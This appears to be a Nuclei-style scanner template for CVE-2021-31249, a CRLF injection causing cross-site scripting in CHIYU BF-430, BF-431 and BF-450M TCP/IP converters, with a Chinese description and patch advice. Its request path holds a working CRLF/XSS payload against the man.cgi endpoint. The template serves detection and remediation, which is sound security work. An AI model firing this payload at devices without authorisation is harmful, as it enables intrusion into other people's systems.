id: CVE-2021-31249
info:
  name: CHIYU TCP/IP Converter devices - CRLF injection
  author:
  - l0ne1y
  description: |-
    CHIYU CRLF导致跨站脚本漏洞
    Chiyu CHIYU BF-430等都是中国台湾七友科技（Chiyu）公司的一款为门禁、考勤系统等设备提供通讯的联网服务器。

    CHIYU Technology Inc 的 BF-430、BF-431 和 BF-450M TCP/IP 转换器设备上存在CRLF漏洞，该可能导致跨站脚本攻击。
  severity: medium
  remediation: |-
    官方修复方案：
    1、建议用户到官方获取最新补丁或者最新版本程序：
    https://www.chiyu-tech.com/msg/message-Firmware-update-87.html

    临时修复方案：
    1、过滤 \r 、\n 之类的换行符，避免输入的数据污染到其他HTTP消息头。
requests:
- matchers:
  - type: status
    status:
    - 302
  - type: word
    condition: and
    part: header
    words:
    - 'Location: setting.htm'
    - <script>alert(document.domain)</script>
  matchers-condition: and
  path:
  - '{{BaseURL}}/man.cgi?redirect=setting.htm%0d%0a%0d%0a<script>alert(document.domain)</script>&failure=fail.htm&type=dev_name_apply&http_block=0&TF_ip0=192&TF_ip1=168&TF_ip2=200&TF_ip3=200&TF_port=&TF_port=&B_mac_apply=APPLY'
  method: GET
